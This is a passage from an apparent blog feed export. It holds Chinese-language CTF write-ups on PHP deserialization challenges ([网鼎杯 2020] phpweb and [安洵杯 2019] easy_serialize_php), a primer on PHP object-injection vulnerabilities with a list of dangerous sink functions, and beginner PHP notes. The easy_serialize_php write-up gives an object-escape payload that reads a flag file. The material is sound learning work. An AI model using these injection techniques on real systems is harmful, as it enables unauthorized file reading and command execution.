data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvTUk0akRWM2Y2Y21ZUm9hLnBuZw==\">https://i.loli.net/2021/07/04/MI4jDV3f6cmYRoa.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>所以我们的目标 1. 绕过 op === &quot;2&quot; 时的强制转换   2. 绕过私有属性时的 ascll 检测</p>\n<p>解决方法：</p>\n<p>1. 当 op === &quot;2&quot; 时才会转换，所以当 op == &quot;2&quot; 时，不会强制转换，因为后者没有对类型强制要求，所以只需让 op = 2  （int 型），在判断时不会因为类型而引起强制转换，即绕过。</p>\n<p>2. 有以下两个方法，第一个更常用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// PHP7.1 以上版本对属性类型不敏感，可以用 public 属性来绕过检查</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示</span></pre></td></tr></table></figure><p>本题第二个绕过我选择第一种方法，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvQ0FORFJzWU15M1BVcVFjLnBuZw==\">https://i.loli.net/2021/07/04/CANDRsYMy3PUqQc.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>打入 payload，在注释中得到 flag，如图：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvc1Z1ZzVoN1VuZkN6alNHLnBuZw==\">https://i.loli.net/2021/07/04/sVug5h7UnfCzjSG.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<h1 id=\"3网鼎杯-2020-朱雀组phpweb\"><a class=\"anchor\" href=\"#3网鼎杯-2020-朱雀组phpweb\">#</a> 3.[网鼎杯 2020 朱雀组] phpweb</h1>\n<p>进去页面后发现五秒刷新一次，还会出现警告 warning，如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/vREfAQ4MzBOsNuZ.png\" alt=\"3.1.png\">&lt;!--p1--&gt;</p>\n<p>用 bp 抓一下包，发现一直在传送两条数据</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvNFNLQU9Nd20xUWZMV25yLnBuZw==\">https://i.loli.net/2021/07/06/4SKAOMwm1QfLWnr.png</span>&quot; alt=&quot;3.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>百度了一下，发现可能有函数执行的操作</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvUW1sWno5eFMxdEY3MkpSLnBuZw==\">https://i.loli.net/2021/07/06/QmlZz9xS1tF72JR.png</span>&quot; alt=&quot;3.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>根据函数 file_get_contents 读取信息，于是得到 index.php：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvTGNCZ2g2RDFhWGtkUkViLnBuZw==\">https://i.loli.net/2021/07/06/LcBgh6D1aXkdREb.png</span>&quot; alt=&quot;3.4.00.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>考虑通过 system、passthur 或者 exec 执行命令读取信息，但是可以发现第 24 行已经将它们在 func 中屏蔽掉。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSVpwNVBGbkdUTjZremlXLnBuZw==\">https://i.loli.net/2021/07/06/IZp5PFnGTN6kziW.png</span>&quot; alt=&quot;3.5.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>就是说其不能作为函数，但是我们可以用反序列化 unserialize () 绕过</p>\n<p>先序列化构造 payload</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvalQ4ZlZVa3RoREZJM1JZLnBuZw==\">https://i.loli.net/2021/07/06/jT8fVUkthDFI3RY.png</span>&quot; alt=&quot;3.6.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>然后再通过 bp 传一次参</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvN3VaTWo5d2Zkb2FUazRyLnBuZw==\">https://i.loli.net/2021/07/06/7uZMj9wfdoaTk4r.png</span>&quot; alt=&quot;3.7.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>由于找不到有用的信息，于是百度后，我 get 到了新方法！！</p>\n<p><strong>find 用法：</strong><br>\n<strong>find path -option [ -print ] [ -exec -ok command ] {} ;</strong><br>\n<strong>path： . 代表当前路径，/ 代表总目录</strong><br>\n<strong> - name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</strong><br>\n<strong> name 可以使用通配符，如 “flag.*”</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWZpbmQuaHRtbA==\">菜鸟教程 find 用法</span></p>\n<p>所以可以构造 find /-iname&quot;flag.*&quot;, 然后序列化得到字符串：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvRFY1NFVBbGNaZ2l2V011LnBuZw==\">https://i.loli.net/2021/07/06/DV54UAlcZgivWMu.png</span>&quot; alt=&quot;3.8.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>然后继续用 bp 传参，找到 flag 文件，通过 readfile 或 file_get_contents 读取 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvYTJmSVRxUzRHNWt0Vk5FLnBuZw==\">https://i.loli.net/2021/07/06/a2fITqS4G5ktVNE.png</span>&quot; alt=&quot;3.9.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p9--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvdlgxUUNub2hldVpSQjRiLnBuZw==\">https://i.loli.net/2021/07/06/vX1QCnoheuZRB4b.png</span>&quot; alt=&quot;3.10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<hr>\n<h1 id=\"4安洵杯-2019easy_serialize_php\"><a class=\"anchor\" href=\"#4安洵杯-2019easy_serialize_php\">#</a> 4.[安洵杯 2019] easy_serialize_php</h1>\n<p>进入网站就能看到原码，先复制到本地</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSG9CRmlNNFRFSlVmWXRqLnBuZw==\">https://i.loli.net/2021/07/06/HoBFiM4TEJUfYtj.png</span>&quot; alt=&quot;4.1.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>先审计代码，在 31 行找到序列化函数，在 38 行找到但反列化函数，且参数可控通过 get 传参</p>\n<p>所以，根据提示先让 $function = phpinfo，通过 bp 传参（或是直接在浏览器输入）</p>\n<p>我先用的 bp，出现代码后复制到本地，查找 flag、ag、fl、f1ag 等等相关名词，成功找到文件</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/ct24bNzhofQ9BvD.png\" alt=\"4.2.png\">&lt;!--p2--&gt;</p>\n<p>后来又试了一下网址直接传，大概浏览了一遍也能找到。</p>\n<p><img data-src=\"https://i.loli.net/2021/07/06/HnglVwDsRmkUfZy.png\" alt=\"4.3.png\">&lt;!--p3--&gt;</p>\n<p>知道了文件名，无法直接读，所以准备用代码中的 file_get_contents () 函数读取</p>\n<p>所以需要让 base64_decode ($userinfo [‘img’]) = d0g3_f1ag.php ，根据百度进行 base64 加密，</p>\n<p>就需要让 $userinfo [‘img’] = ZDBnM19mMWFnLnBocA==</p>\n<p>又因为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>i</mi><mi>m</mi><mi>g</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>是由</mtext></mrow><annotation encoding=\"application/x-tex\">userinfo[‘img’]是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span> serialize_info 反序列化得到的</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><msub><mi>e</mi><mi>i</mi></msub><mi>n</mi><mi>f</mi><mi>o</mi><mtext>又是由</mtext></mrow><annotation encoding=\"application/x-tex\">serialize_info又是由</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord cjk_fallback\">又</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">由</span></span></span></span>_SESSION 序列化然后过滤得到的</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvSDg1VjNMamdHUjI2Rm1oLnBuZw==\">https://i.loli.net/2021/07/06/H85V3LjgGR26Fmh.png</span>&quot; alt=&quot;4.7.png&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>但是如果对 $_SESSION ['img'] 赋值，则会被 sha1 进行再次加密，且不可逆，无法得到答案</p>\n<p>所以只能从过滤函数过滤序列化字符串处开始下手</p>\n<p>此处参考了 https://blog.csdn.net/qq_43622442/article/details/106003691</p>\n<p>当中对对象逃逸问题有详细的说明：（我还在参悟这东西，实在头大）</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvcWJ4cllDYzh5UE1PdzFkLnBuZw==\">https://i.loli.net/2021/07/06/qbxrYCc8yPMOw1d.png</span>&quot; alt=&quot;4.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>flagflagflagflagflagflag<span class=\"token operator\">&amp;</span><span class=\"token constant\">_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a<span class=\"token string double-quoted-string\">\";s:8:\"</span><span class=\"token keyword\">function</span><span class=\"token string double-quoted-string\">\";s:7:\"</span>xxx<span class=\"token string double-quoted-string\">\";s:3:\"</span>img<span class=\"token string double-quoted-string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA<span class=\"token operator\">==</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后输入后查看源码有注释：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvMk85dWZjOHJGTUJzUXlpLnBuZw==\">https://i.loli.net/2021/07/06/2O9ufc8rFMBsQyi.png</span>&quot; alt=&quot;4.5.png&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>把 img 文件名加密后一换，长度没变，就能得到 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDYvVGZ2UGRsQTlLV0dzaGF0LnBuZw==\">https://i.loli.net/2021/07/06/TfvPdlA9KWGshat.png</span>&quot; alt=&quot;4.6.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://example.com/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "ctfweb-PHP反序列化",
            "date_published": "2021-07-04T10:33:13.829Z",
            "content_html": "<p>学习了一下 php 反序列化漏洞，并做了一些整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"简单理解\"><a class=\"anchor\" href=\"#简单理解\">#</a> 简单理解</h1>\n<p>serialize 将一个对象转换成一个字符串<br>\n unserialize 将一个字符串还原成一个对象</p>\n<hr>\n<p><em><strong>序列化：</strong></em></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvajhQRXVrbTZ0UzNoeEwxLnBuZw==\">https://i.loli.net/2021/07/04/j8PEukm6tS3hxL1.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>如图所示:</p>\n<p><code>O:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jack&quot;;s:3:&quot;age&quot;;i:18;&#125;</code></p>\n<p>就是我们输入的 people 信息经过序列化得到的字符串，其中</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvT2pQbnpZYWcxb0xTc1FXLnBuZw==\">https://i.loli.net/2021/07/04/OjPnzYag1oLSsQW.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>需要注意的是：</p>\n<p><strong>\\x00 + 类名 + \\x00 + 变量名 反序列化出来的是 private 变量</strong></p>\n<p><strong>\\x00 + * + \\x00 + 变量名 反序列化出来的是 protected 变量</strong></p>\n<hr>\n<p><em><strong>反序列化</strong></em></p>\n<p>我们通过 post 传递这串序列化的字符串，来验证使用 unserialize</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvb1VLY1NQTVF0a0hSM0lGLnBuZw==\">https://i.loli.net/2021/07/04/oUKcSPMQtkHR3IF.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>两者配合引起了问题所在。</p>\n<hr>\n<h1 id=\"魔术方法\"><a class=\"anchor\" href=\"#魔术方法\">#</a> 魔术方法</h1>\n<p>__wakeup () // 使用 unserialize 时触发<br>\n__sleep () // 使用 serialize 时触发</p>\n<p>__destruct () // 对象被销毁时触发</p>\n<p>__call () // 在对象上下文中调用不可访问的方法时触发<br>\n__callStatic () // 在静态上下文中调用不可访问的方法时触发</p>\n<p>__get () // 用于从不可访问的属性读取数据<br>\n__set () // 用于将数据写入不可访问的属性</p>\n<p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发<br>\n__unset () // 在不可访问的属性上使用 unset () 时触发</p>\n<p>__toString () // 把类当作字符串使用时触发<br>\n__invoke () // 当脚本尝试将对象调用为函数时触发</p>\n<p><em><strong>最常用的：</strong></em></p>\n<pre><code>__construct，构造函数，PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初 始化工作。 \n__toString，打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo 打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含 的数据。\n__destruct，析构函数，PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言， 如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 \n__sleep magic方法在一个对象被序列化的时候调用。 \n__wakeup magic方法在一个对象被反序列化的时候调用。\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvYUgxQlRqVjRJM2tuOExkLnBuZw==\">https://i.loli.net/2021/07/04/aH1BTjV4I3kn8Ld.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDcvMDQvSXI2Z1RNT0dXZVY1eGtBLnBuZw==\">https://i.loli.net/2021/07/04/Ir6gTMOGWeV5xkA.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<hr>\n<h1 id=\"php反序列化漏洞\"><a class=\"anchor\" href=\"#php反序列化漏洞\">#</a> php 反序列化漏洞</h1>\n<p>PHP 反序列化漏洞又叫 PHP 对象注入漏洞，反序列化的数据本质上来说是没有危害的，但是在 反序列化参数可控时，可能会产生严重的安全威胁。当传给  unserialize () 的参数可控时， 我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>\n<p>攻击流程就是在本地写一个序列化的文件，拿得到的字符串去打远程</p>\n<p>重点关注的函数：<br>\n代码执行：eval ()      assert ()<br>\n 命令执行：exec ()      passthru ()      system ()      popen ()<br>\n<strong> 文件操作</strong>：file_put_contents ()      file_get_contents ()      unlink ()</p>\n<p>常用：</p>\n<p>exec — 执行一个外部程序（exec (whoami)）</p>\n<p>passthru — 执行外部程序并且显示原始输出，同上</p>\n<p>system — 执行外部程序，并且显示输出（system (whoami)、system (ls)）</p>\n<p>file_get_contents — 将整个文件读入一个字符串（file_get_contents (flag.php)）</p>\n<p>unlink — 删除文件</p>\n<hr>\n<p><strong>下一篇做题练手</strong></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/07/01/program/php/phpstudy/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "url": "http://example.com/2021/07/01/program/php/phpstudy/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "title": "php的浅显学习中一些知识点",
            "date_published": "2021-07-01T03:03:51.726Z",
            "content_html": "<p>为了读懂 web 一些漏洞和原理，浅显学习了一下 php 语言，并做了一点简陋的笔记，方便回顾。</p>\n<p>后面还会不断的或是专业的学习这门语言。</p>\n<p><span id=\"more\"></span></p>\n<p>1. 变量以 $ 符号开始，不能包含空格，区分大小写。php 定义变量，不用声明变量类型。</p>\n<p>2. 以 <code>?php</code>  开始，以 <code>?&gt;</code>  结尾。</p>\n<p>3. 在函数内调用全局变量，要用  <code>global</code>  关键字，比如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">global</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当然，也可这么引用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>4. <code>static</code>  作用域，用法语 c 语言差不多，让一个变量的值不会被清除或重置。</p>\n<p>5.echo 和 print 的区别：</p>\n<ul>\n<li><code>echo</code>  - 可以输出一个或多个字符串，没有返回值，速度比 print 要快。</li>\n<li><code>print</code>  - 只允许输出一个字符串，返回值总为 1</li>\n</ul>\n<p>6. 类型比较， <code>==</code>  只比较值，不比较类型； <code>===</code>  既比较值也比较类型</p>\n<p>7. 定义常量时 可选择是否区分大小写区分，不区分则在后面加 <code>true</code> ，例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>8. 并置运算符 (.)，例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$txt1</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$txt2</span> <span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>9. 整除运算符 <code> intdiv()</code>  ，该函数返回值为第一个参数除以第二个参数的值并向下取整数，例如 <code>intdiv(10,3)</code>   值为 3</p>\n<p>10. 赋值运算符中    <code>a .= b</code> , 相当于  <code>a = a . b</code>  , 连接两个字符串。</p>\n<p>11. 比较运算符中   <code>x &lt;&gt; y</code>  相当于  <code>x != y</code>  ， <code>x!==y</code>  会同时判断值和类型。</p>\n<p>12. 数组运算符中， <code>x + y</code>  能拼接两个数组。</p>\n<p>13. 组合比较符 <code>&lt;=&gt;</code> ，用法：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">&lt;=></span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>if $a &gt; $b, $c = 1;</p>\n<p>if $a &lt; $b, $c = -1;</p>\n<p>if $a = $b, $c = 0;</p>\n<p>14. 数组，可以储存字符串，用 <strong>array()</strong> 函数创建。</p>\n<p>关联数组，可以通过一个数组关联到另外的数组。</p>\n<p>部分有关数组的函数：</p>\n<ul>\n<li>sort () - 对数组进行升序排列</li>\n<li>rsort () - 对数组进行降序排列</li>\n<li>asort () - 根据关联数组的键值，对数组进行升序排列</li>\n<li>ksort () - 根据关联数组的键名，对数组进行升序排列</li>\n<li>arsort () - 根据关联数组的键值，对数组进行降序排列</li>\n<li>krsort () - 根据关联数组的键名，对数组进行降序排列</li>\n<li>count () - 用于返回数组元素的数量。</li>\n</ul>\n<p>15.foreach 循环，用于遍历数组。例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Google\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Runoob\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$value</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>16. 常用函数</p>\n<p>创建一个函数用   <code>function xxx()</code></p>\n<p><strong>strpos()</strong>  用于在字符串内查找一个字符或一段指定的文本。</p>\n<p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果 未找到匹配，则返回 FALSE。</p>\n<p>17.php 魔术常量</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">__LINE__</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">#报行号</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token constant\">__FILE__</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">#报文件路径和文件名</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token constant\">__DIR__</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">#报文件所在目录</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token constant\">__FUNCTION__</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">#返回函数名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token constant\">__CLASS__</span></pre></td></tr><tr><td 